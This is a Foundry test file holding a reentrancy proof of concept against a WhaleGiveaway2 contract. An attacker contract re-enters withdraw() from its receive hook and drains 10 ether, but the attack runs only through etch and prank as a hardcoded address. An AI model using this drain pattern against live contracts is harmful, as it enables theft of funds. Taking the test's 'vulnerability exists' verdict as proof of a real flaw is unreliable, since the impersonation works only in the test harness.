// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol";

contract ReentrancyAttacker {
    WhaleGiveaway2 public whaleContract;
    bool public isFirstCall;

    receive() external payable {
        if (isFirstCall) {
            isFirstCall = false;
            // Transfer 1 ether to refill contract balance
            payable(address(whaleContract)).transfer(1 ether);
            whaleContract.withdraw();
        }
    }

    constructor(address _whaleContract) {
        // Convert address to payable before contract cast
        whaleContract = WhaleGiveaway2(payable(_whaleContract));
        isFirstCall = true;
    }
}

contract WhaleGiveaway2ReentrancyTest is Test {
    WhaleGiveaway2 public whale;
    ReentrancyAttacker public tempAttacker;
    address constant specificAddress = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;

    function setUp() public {
        whale = new WhaleGiveaway2();
    }

    function testReentrancyAttack() public {
        // Load initial funds into contract
        vm.deal(address(whale), 10 ether);
        assertEq(address(whale).balance, 10 ether);

        // Create temporary attacker to get bytecode
        tempAttacker = new ReentrancyAttacker(address(whale));
        bytes memory runtimeCode = address(tempAttacker).code;

        // Replace specificAddress with malicious contract
        vm.etch(specificAddress, runtimeCode);

        // Fund attacker contract
        vm.deal(specificAddress, 1 ether);
        
        // BEFORE: State snapshot
        uint256 beforeWhaleBalance = address(whale).balance;
        uint256 beforeAttackerBalance = specificAddress.balance;
        console.log("--- BEFORE-Trigger State ---");
        console.log("Whale Contract Balance: %d", beforeWhaleBalance);
        console.log("Attacker Balance: %d", beforeAttackerBalance);

        console.log("--- Trigger Attack ---");

        // Execute attack
        vm.startPrank(specificAddress);
        whale.withdraw();
        vm.stopPrank();

        // AFTER: State snapshot
        uint256 afterWhaleBalance = address(whale).balance;
        uint256 afterAttackerBalance = specificAddress.balance;
        console.log("--- AFTER-Trigger State ---");
        console.log("Whale Contract Balance: %d", afterWhaleBalance);
        console.log("Attacker Balance: %d", afterAttackerBalance);

        // Verify all funds drained
        assertEq(afterWhaleBalance, 0, "Contract funds drained");
        assertEq(afterAttackerBalance, 11 ether, "Attaker gained 11 ether");

        // Differential comparison
        console.log("--- Differential Result ---");
        console.log("Vulnerability exists if Whale balance != 0 and attacker gained 10 ETH profit");
        bool whaleBalanceChanged = (afterWhaleBalance != beforeWhaleBalance);
        bool attackerValueChange = (afterAttackerBalance - beforeAttackerBalance == 10 ether); // Net gain excluding reentrant cost
        bool attackerHasAllFunds = (afterWhaleBalance == 0) && (afterAttackerBalance == 11 ether);
        
        console.log("Contract balance changed: ", whaleBalanceChanged);
        console.log("Attacker gained 10 ETH: ", attackerValueChange);
        console.log("Contract drained & attacker holds 11 ETH: ", attackerHasAllFunds);
        
        // Final vulnerability verdict
        if (whaleBalanceChanged && attackerValueChange && attackerHasAllFunds) {
            console.log("Vulnerability Exists: Reentrancy attack drained contract balance");
        } else {
            console.log("Vulnerability not Exist: Contract funds not drained as expected");
        }
    }
}